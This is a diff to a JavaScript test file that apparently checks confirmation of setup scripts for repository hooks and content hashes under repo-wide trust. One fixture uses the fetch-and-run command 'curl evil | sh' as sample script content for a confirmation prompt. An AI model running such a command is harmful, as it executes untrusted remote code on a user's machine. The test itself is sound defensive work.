@@ -514,8 +514,22 @@ describe('ensureHooksConfirmed', () => {
     await vi.waitFor(() => expect(pending).toHaveLength(1))
     expect(pending[0].data.scriptContent).toBe('curl evil | sh')
     expect(pending[0].data.scriptKind).toBe('setup')
+    expect(pending[0].data.createdBranchReview).toBe(true)
     pending[0].resolve('skip')
 
     await expect(promise).resolves.toEqual({ decision: 'skip' })
+  })
+
+  it('returns the created branch content hash under repo-wide trust so the host can run it', async () => {
+    const { state, pending } = createTestState()
+    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }
+
+    await expect(
+      confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'pnpm build')
+    ).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: createHash('sha256').update('pnpm build').digest('hex')
+    })
+    expect(pending).toHaveLength(0)
   })
 })
